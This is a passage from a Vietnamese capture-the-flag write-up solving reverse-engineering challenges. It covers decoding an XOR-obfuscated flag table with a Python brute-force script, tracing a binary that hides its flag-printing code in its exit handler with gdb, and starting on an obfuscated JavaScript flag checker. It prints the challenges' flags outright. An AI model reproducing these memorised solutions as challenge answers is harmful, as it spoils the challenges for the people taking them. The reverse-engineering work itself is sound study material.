</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>DF                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020E0</span>                 db  <span style="color:#ae81ff">38</span>h ; <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020E1</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020E2</span>                 db  <span style="color:#ae81ff">77</span>h ; w
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020E3</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020E4</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020E5</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020E6</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020E7</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020E8</span>                 db  <span style="color:#ae81ff">69</span>h ; i
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020E9</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>EA                 db  <span style="color:#ae81ff">76</span>h ; v
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>EB                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>EC                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>ED                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>EE                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>EF                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span><span style="color:#ae81ff">0</span>                 db  <span style="color:#ae81ff">3</span>Ah ; <span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span><span style="color:#ae81ff">1</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span><span style="color:#ae81ff">2</span>                 db  <span style="color:#ae81ff">7</span>Eh ; <span style="color:#f92672">~</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span><span style="color:#ae81ff">3</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span><span style="color:#ae81ff">4</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span><span style="color:#ae81ff">5</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span><span style="color:#ae81ff">6</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span><span style="color:#ae81ff">7</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span><span style="color:#ae81ff">8</span>                 db  <span style="color:#ae81ff">6</span>Bh ; k
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span><span style="color:#ae81ff">9</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span>A                 db  <span style="color:#ae81ff">44</span>h ; D
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020FF</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002100</span>                 db  <span style="color:#ae81ff">3</span>Ch ; <span style="color:#f92672">&lt;</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002101</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002102</span>                 db  <span style="color:#ae81ff">76</span>h ; v
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002103</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002104</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002105</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002106</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002107</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000210</span><span style="color:#ae81ff">8</span>                 db  <span style="color:#ae81ff">6</span>Dh ; m
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000210</span><span style="color:#ae81ff">9</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000210</span>A                 db  <span style="color:#ae81ff">2</span>Dh ; <span style="color:#f92672">-</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000210</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000210</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000210</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000210</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000210F</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002110</span>                 db  <span style="color:#ae81ff">3</span>Eh ; <span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002111</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002112</span>                 db  <span style="color:#ae81ff">7</span>Ch ; <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002113</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002114</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002115</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002116</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002117</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000211</span><span style="color:#ae81ff">8</span>                 db  <span style="color:#ae81ff">6F</span>h ; o
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000211</span><span style="color:#ae81ff">9</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000211</span>A                 db  <span style="color:#ae81ff">62</span>h ; b
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000211</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000211</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000211</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000211</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000211F</span>                 db    <span style="color:#ae81ff">0</span>  
</span></span></code></pre></div><p>Mọi thứ đã rõ ràng, dưới đây là script cho bài toán này:</p>
<p><a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/wannaone-vault/vault.py">vault.py</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>num <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x577020</span>,<span style="color:#ae81ff">0x302071</span>,<span style="color:#ae81ff">0x797022</span>,<span style="color:#ae81ff">0x612073</span>,<span style="color:#ae81ff">0x357024</span>,<span style="color:#ae81ff">0x712075</span>,<span style="color:#ae81ff">0x597026</span>,<span style="color:#ae81ff">0x372077</span>,<span style="color:#ae81ff">0x787028</span>,<span style="color:#ae81ff">0x3a2079</span>,<span style="color:#ae81ff">0x78702a</span>,<span style="color:#ae81ff">0x6a207b</span>,<span style="color:#ae81ff">0x78702c</span>,<span style="color:#ae81ff">0x3c207d</span>,<span style="color:#ae81ff">0x3e702e</span>,<span style="color:#ae81ff">0x61207f</span>,<span style="color:#ae81ff">0x4f7030</span>,<span style="color:#ae81ff">0x672061</span>,<span style="color:#ae81ff">0x737032</span>,<span style="color:#ae81ff">0x662063</span>,<span style="color:#ae81ff">0x787034</span>,<span style="color:#ae81ff">0x612065</span>,<span style="color:#ae81ff">0x497036</span>,<span style="color:#ae81ff">0x702067</span>,<span style="color:#ae81ff">0x777038</span>,<span style="color:#ae81ff">0x762069</span>,<span style="color:#ae81ff">0x7e703a</span>,<span style="color:#ae81ff">0x44206b</span>,<span style="color:#ae81ff">0x76703c</span>,<span style="color:#ae81ff">0x2d206d</span>,<span style="color:#ae81ff">0x7c703e</span>,<span style="color:#ae81ff">0x62206f</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>idx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> key <span style="color:#f92672">in</span> num:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> idx <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (((((x <span style="color:#f92672">^</span> idx) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x7020</span>) <span style="color:#f92672">^</span> idx) <span style="color:#f92672">==</span> key):
</span></span><span style="display:flex;"><span>                flag<span style="color:#f92672">.</span>append(x)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (((((y <span style="color:#f92672">^</span> idx) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x2070</span>) <span style="color:#f92672">^</span> idx) <span style="color:#f92672">==</span> key):
</span></span><span style="display:flex;"><span>                flag<span style="color:#f92672">.</span>append(y)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    idx <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(chr(i) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> flag))
</span></span></code></pre></div><p>-&gt; <code>FLAG: W1{b1t_0p3rat10n_vault_good_j0b}</code></p>
<h2 id="wanna-one-intels">wanna-one intels</h2>
<p><code>Description: Wait what? The intel is empty?????</code></p>
<p><code>Chall file:</code> <a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/wannaone-intels/wanna-one-intels">wanna-one-intels</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╭─</span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#f92672">~/</span>CTF<span style="color:#f92672">/</span>wannagame<span style="color:#f92672">/</span>chall                                                          <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">18</span><span style="color:#f92672">:</span><span style="color:#ae81ff">50</span><span style="color:#f92672">:</span><span style="color:#ae81ff">01</span> <span style="color:#960050;background-color:#1e0010">─╮</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╰─❯</span> file wanna<span style="color:#f92672">-</span>one<span style="color:#f92672">-</span>intels                                                                        <span style="color:#960050;background-color:#1e0010">─╯</span>
</span></span><span style="display:flex;"><span>wanna<span style="color:#f92672">-</span>one<span style="color:#f92672">-</span>intels: ELF <span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>bit LSB executable, x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span>, version <span style="color:#ae81ff">1</span> (GNU<span style="color:#f92672">/</span>Linux), statically linked, BuildID[sha1]<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>d076f0b0fa3a59f76928ddb65212898859409ff, <span style="color:#66d9ef">for</span> GNU<span style="color:#f92672">/</span>Linux <span style="color:#ae81ff">3.2.0</span>, not stripped
</span></span></code></pre></div><p>Vẫn là 1 file ELF 64bit (không bị stripped), nhưng lúc mình kiểm tra hàm main, thì nó chỉ thực hiện return ??
Vậy thì chương trình giấu số code còn lại ở đâu ????</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000401620</span> ; <span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000401620</span>                 public main
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000401620</span> main            proc near               ; DATA XREF: _start<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span><span style="color:#960050;background-color:#1e0010">↓</span>o
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000401620</span> ; __unwind {
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000401620</span>                 endbr64
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000401624</span>                 xor     eax, eax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000401626</span>                 retn
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000401626</span> ; } <span style="color:#75715e">// starts at 401620
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.text:<span style="color:#ae81ff">0000000000401626</span> main            endp
</span></span></code></pre></div><p>Ban đầu, mình thấy hơi hoang mang, và vì đây là file binary dùng <code>statically linked</code>, nên mình khá lười trong việc tìm xem hàm nào ẩn giấu trong IDA</p>
<p>Nên mình quyết định chạy file và có kết quả sau:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╭─</span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#f92672">~/</span>CTF<span style="color:#f92672">/</span>wannagame<span style="color:#f92672">/</span>chall                                                                                                                           <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">12</span><span style="color:#f92672">:</span><span style="color:#ae81ff">19</span><span style="color:#f92672">:</span><span style="color:#ae81ff">58</span> <span style="color:#960050;background-color:#1e0010">─╮</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╰─❯</span> .<span style="color:#f92672">/</span>wanna<span style="color:#f92672">-</span>one<span style="color:#f92672">-</span>intels                                                                                                                                            <span style="color:#960050;background-color:#1e0010">─╯</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">?????</span> 
</span></span></code></pre></div><p>Ồ, mặc nhiên hàm <code>main</code> chỉ <code>xor eax, eax; ret</code> mà lại có thể in ra được các kí tự <code>đặc biệt</code> như này, mình lấy làm lạ.
Mình nghi ngờ là ở hàm <code>start</code> hoặc <code>exit</code> khi chương trình bắt đầu hoặc kết thúc có những đoạn code ẩn để in các kí tự này</p>
<p>Để chắc chắn, mình dùng <code>gdb</code> để debug và đặt <code>breakpoint</code> ở ret để kiểm tra</p>
<pre tabindex="0"><code>► 0x401626 &lt;main+6&gt;                        ret                                  &lt;0x401b8a; __libc_start_call_main+106&gt;
    ↓
   0x401b8a &lt;__libc_start_call_main+106&gt;    mov    edi, eax
</code></pre><p>Mình đã tới được <code>ret</code> và chưa có gì được in ra, mình lần theo hàm <code>exit</code> để xem thứ gì xảy ra. Và mình đã phát hiện được 1 thứ đặc biệt</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">►</span>  <span style="color:#ae81ff">0x40a7f0</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">&gt;</span>       movabs rax, <span style="color:#ae81ff">0x101010101010101</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a7fa</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">10</span><span style="color:#f92672">&gt;</span>    push   rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a7fb</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">11</span><span style="color:#f92672">&gt;</span>    movabs rax, <span style="color:#ae81ff">0x1010b3e3e3e3e3e</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a805</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">21</span><span style="color:#f92672">&gt;</span>    xor    qword ptr [rsp], rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a809</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">25</span><span style="color:#f92672">&gt;</span>    mov    rsi, rsp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a80c</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">28</span><span style="color:#f92672">&gt;</span>    push   <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a80e</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">30</span><span style="color:#f92672">&gt;</span>    pop    rdi
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a80f</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">31</span><span style="color:#f92672">&gt;</span>    push   <span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a811</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">33</span><span style="color:#f92672">&gt;</span>    pop    rdx
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a812</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">34</span><span style="color:#f92672">&gt;</span>    push   <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a814</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">36</span><span style="color:#f92672">&gt;</span>    pop    rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a815</span> <span style="color:#f92672">&lt;</span>__run_exit_handlers<span style="color:#f92672">+</span><span style="color:#ae81ff">37</span><span style="color:#f92672">&gt;</span>    syscall
</span></span></code></pre></div><p>Ở trong hàm <code>__run_exit_handlers</code> thật sự đã dùng các chỉ thị để in ra chuỗi kí tự <code>????</code>, mình tiếp tục theo hàm này để xem có chuyện gì xảy ra</p>
<p>-&gt; Cuối cùng, mình thấy hàm dùng 1 vòng lặp để thực hiện các phép toán và cứ giảm stack cho đến khi đầy đủ kí tự flag và tiếp tục kiểm tra trên stack thì mình thấy các kí tự của flag, sau đó chương trình gọi syscall exit để kết thúc</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0000</span><span style="color:#960050;background-color:#1e0010">│</span> rsp <span style="color:#ae81ff">0x7fffffffdd00</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x747375637b3157b0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span><span style="color:#f92672">:</span><span style="color:#ae81ff">000</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">│</span>     <span style="color:#ae81ff">0x7fffffffdd08</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">0</span>m_r0ut1n3s_w0w<span style="color:#f92672">!</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">02</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0010</span><span style="color:#960050;background-color:#1e0010">│</span>     <span style="color:#ae81ff">0x7fffffffdd10</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>n3s_w0w<span style="color:#f92672">!</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">03</span><span style="color:#f92672">:</span><span style="color:#ae81ff">001</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">│</span>     <span style="color:#ae81ff">0x7fffffffdd18</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x7d</span> <span style="color:#75715e">/* &#39;}&#39; */</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0020</span><span style="color:#960050;background-color:#1e0010">│</span> rsi <span style="color:#ae81ff">0x7fffffffdd20</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0xa3f3f3f3f3f</span> <span style="color:#75715e">/* &#39;?????\n&#39; */</span>
</span></span></code></pre></div><p>Get flag !</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> search <span style="color:#960050;background-color:#1e0010">&#39;</span>W1{<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>Searching <span style="color:#66d9ef">for</span> value: <span style="color:#960050;background-color:#1e0010">&#39;</span>W1{<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>[stack]         <span style="color:#ae81ff">0x7fffffffdd01</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>W1{cust0m_r0ut1n3s_w0w<span style="color:#f92672">!</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span></code></pre></div><p>-&gt; <code>FLAG: W1{cust0m_r0ut1n3s_w0w!}</code></p>
<h2 id="pu-pu-flag-checker">Pu Pu flag checker</h2>
<p><code>Description: I thought it really easy.</code></p>
<p><code>Chall file:</code> <a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/pupu-flag-checker/flagchecker.html">flagchecker.html</a></p>
<pre tabindex="0"><code>Welcome to Pu Pu Flag checker
 
Input your flag, ex: W1{You_suck}     [Confirm]
</code></pre><p>-&gt; Chương trình cho ta 1 file html, dường như là trang để check flag cổ điển, mình view source để xem chương trình chứa gì, thì thấy 1 dòng chứa những đoạn code có vẻ quen thuộc</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>(<span style="color:#a6e22e">function</span>(_0x21262b,_0x48fc44){<span style="color:#66d9ef">const</span> _0x3d9bc6<span style="color:#f92672">=</span>_0x17ea,_0x1bc71f<span style="color:#f92672">=</span><span style="color:#a6e22e">_0x21262b</span>();<span style="color:#66d9ef">while</span>(<span style="color:#f92672">!!</span>[]){try{<span style="color:#66d9ef">const</span> _0x101b0c<span style="color:#f92672">=</span><span style="color:#a6e22e">parseInt</span>(<span style="color:#a6e22e">_0x3d9bc6</span>(<span style="color:#ae81ff">0x92</span>))<span style="color:#f92672">/</span><span style="color:#ae81ff">0x1</span><span style="color:#f92672">+</span><span style="color:#a6e22e">parseInt</span>(<span style="color:#a6e22e">_0x3d9bc6</span>(<span style="color:#ae81ff">0x89</span>))<span style="color:#f92672">/</span><span style="color:#ae81ff">0x2</span><span style="color:#f92672">+-</span><span style="color:#a6e22e">parseInt</span>(<span style="color:#a6e22e">_0x3d9bc6</span>(<span style="color:#ae81ff">0x8d</span>))<span style="color:#f92672">/</span><span style="color:#ae81ff">0x3</span><span style="color:#f92672">+-</span><span style="color:#a6e22e">parseInt</span>(<span style="color:#a6e22e">_0x3d9bc6</span>(<span style="color:#ae81ff">0x87</span>))<span style="color:#f92672">/</span><span style="color:#ae81ff">0x4</span><span style="color:#f92672">*</span>(<span style="color:#f92672">-</span><span style="color:#a6e22e">parseInt</span>(<span style="color:#a6e22e">_0x3d9bc6</span>(<span style="color:#ae81ff">0x8f</span>))<span style="color:#f92672">/</span><span style="color:#ae81ff">0x5</span>)<span style="color:#f92672">+</span><span style="color:#a6e22e">parseInt</span>(<span style="color:#a6e22e">_0x3d9bc6</span>(<span style="color:#ae81ff">0x94</span>))<span style="color:#f92672">/</span><span style="color:#ae81ff">0x6</span><span style="color:#f92672">+-</span><span style="color:#a6e22e">parseInt</span>(<span style="color:#a6e22e">_0x3d9bc6</span>(<span style="color:#ae81ff">0x84</span>))<span style="color:#f92672">/</span><span style="color:#ae81ff">0x7</span><span style="color:#f92672">+</span><span style="color:#a6e22e">parseInt</span>(<span style="color:#a6e22e">_0x3d9bc6</span>(<span style="color:#ae81ff">0x8e</span>))<span style="color:#f92672">/</span><span style="color:#ae81ff">0x8</span><span style="color:#f92672">*</span>(<span style="color:#a6e22e">parseInt</span>(<span style="color:#a6e22e">_0x3d9bc6</span>(<span style="color:#ae81ff">0x90</span>))<span style="color:#f92672">/</span><span style="color:#ae81ff">0x9</span>);<span style="color:#66d9ef">if</span>(_0x101b0c<span style="color:#f92672">===</span>_0x48fc44)<span style="color:#66d9ef">break</span>;<span style="color:#66d9ef">else</span> _0x1bc71f[<span 